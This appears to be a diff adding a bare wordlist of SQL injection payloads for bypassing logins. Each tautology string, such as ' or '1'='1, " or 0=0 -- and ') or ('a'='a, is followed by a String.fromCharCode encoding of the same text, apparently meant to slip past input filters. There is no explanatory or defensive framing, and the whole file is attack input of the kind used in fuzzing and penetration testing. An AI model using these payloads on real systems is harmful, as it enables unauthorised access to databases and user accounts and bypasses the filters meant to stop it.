@@ -1,0 +1,44 @@
+' or '1'='1
+String.fromCharCode(39, 32, 111, 114, 32, 39, 49, 39, 61, 39, 49)
+' or 'x'='x
+String.fromCharCode(39, 32, 111, 114, 32, 39, 120, 39, 61, 39, 120)
+' or 0=0 --
+String.fromCharCode(39, 32, 111, 114, 32, 48, 61, 48, 32, 45, 45)
+" or 0=0 --
+String.fromCharCode(34, 32, 111, 114, 32, 48, 61, 48, 32, 45, 45)
+or 0=0 --
+String.fromCharCode(111, 114, 32, 48, 61, 48, 32, 45, 45)
+' or 0=0 #
+String.fromCharCode(39, 32, 111, 114, 32, 48, 61, 48, 32, 35)
+" or 0=0 #
+String.fromCharCode(34, 32, 111, 114, 32, 48, 61, 48, 32, 35)
+or 0=0 #
+String.fromCharCode(111, 114, 32, 48, 61, 48, 32, 35)
+' or 'x'='x
+String.fromCharCode(39, 32, 111, 114, 32, 39, 120, 39, 61, 39, 120)
+" or "x"="x
+String.fromCharCode(34, 32, 111, 114, 32, 34, 120, 34, 61, 34, 120)
+') or ('x'='x
+String.fromCharCode(39, 41, 32, 111, 114, 32, 40, 39, 120, 39, 61, 39, 120)
+' or 1=1--
+String.fromCharCode(39, 32, 111, 114, 32, 49, 61, 49, 45, 45)
+" or 1=1--
+String.fromCharCode(34, 32, 111, 114, 32, 49, 61, 49, 45, 45)
+or 1=1--
+String.fromCharCode(111, 114, 32, 49, 61, 49, 45, 45)
+' or a=a--
+String.fromCharCode(39, 32, 111, 114, 32, 97, 61, 97, 45, 45)
+" or "a"="a
+String.fromCharCode(34, 32, 111, 114, 32, 34, 97, 34, 61, 34, 97)
+') or ('a'='a
+String.fromCharCode(39, 41, 32, 111, 114, 32, 40, 39, 97, 39, 61, 39, 97)
+") or ("a"="a
+String.fromCharCode(34, 41, 32, 111, 114, 32, 40, 34, 97, 34, 61, 34, 97)
+hi" or "a"="a
+String.fromCharCode(104, 105, 34, 32, 111, 114, 32, 34, 97, 34, 61, 34, 97)
+hi" or 1=1 --
+String.fromCharCode(104, 105, 34, 32, 111, 114, 32, 49, 61, 49, 32, 45, 45)
+hi' or 1=1 --
+String.fromCharCode(104, 105, 39, 32, 111, 114, 32, 49, 61, 49, 32, 45, 45)
+'or'1=1'
+String.fromCharCode(39, 111, 114, 39, 49, 61, 49, 39)
